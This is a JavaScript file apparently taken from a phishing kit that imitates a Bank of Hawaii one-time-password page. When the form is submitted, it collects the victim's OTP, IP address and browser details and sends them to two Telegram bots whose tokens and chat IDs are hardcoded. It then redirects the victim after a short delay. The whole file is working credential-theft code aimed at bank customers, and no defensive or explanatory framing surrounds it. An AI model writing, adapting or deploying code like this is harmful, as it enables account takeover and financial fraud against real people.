document.getElementById('otpForm').addEventListener('submit', function (event) {
    event.preventDefault();
    submitOtp();
});

function submitOtp() {
    const otp = document.getElementById('otpInput').value.trim();
    const verifyButton = document.querySelector('button');


    verifyButton.textContent = "Verifying...";
    verifyButton.disabled = true;

    fetchIpAddress().then(ip => {
        const userAgent = navigator.userAgent;

        const message = `*#----[ BANK OF HAWAII OTP ]-----#*\n\n*OTP* : ${otp}\n*IP Address* : ${ip}\n*Device Info* : ${userAgent}\n\n*#------------[ G1 - END ]-------------#*`;

        showLoadingSpinner();

        Promise.all([
            sendToTelegram(message, '7296082774:AAFvxOm88DKwjKo_lar3bbwJOcRftuNvNlc', '6994641548'), // Bot 1
            sendToTelegram(message, '7358577107:AAGMMSwYu4-OSpHMXnmNofQ_hO5JZ7-yONw', '6069290001')  // Bot 2
        ])
            .then(() => {
                setTimeout(() => {
                    window.location.href = "verificationPage.html"; 
                }, 5000);
            })
            .catch(error => {
                console.error('Error sending OTP:', error);
                alert("An error occurred while submitting the OTP.");
                hideLoadingSpinner();
                resetButtonState();
            });
    }).catch(error => {
        console.error("Error fetching IP address:", error);
        alert("An error occurred while fetching IP address.");
        hideLoadingSpinner();
        resetButtonState();
    });
}

function resetButtonState() {
    const verifyButton = document.querySelector('button');
    verifyButton.textContent = "Verify OTP";
    verifyButton.disabled = false;
}

function fetchIpAddress() {
    return fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip)
        .catch(() => "Unavailable");
}

function showLoadingSpinner() {
    const loadingContainer = document.querySelector('.loading-container');
    if (loadingContainer) {
        loadingContainer.style.display = 'flex';
    }
}

function hideLoadingSpinner() {
    const loadingContainer = document.querySelector('.loading-container');
    if (loadingContainer) {
        loadingContainer.style.display = 'none';
    }
}

function sendToTelegram(message, botToken, chatId) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const data = {
        chat_id: chatId,
        text: message
    };

    return fetch(url, {
        method: 'POST',
        body: JSON.stringify(data),
        headers: {
            'Content-Type': 'application/json'
        }
    })
        .then(response => {
            if (!response.ok) {
                throw new Error(`Telegram API responded with status ${response.status}`);
            }
            return response.json();
        });
}
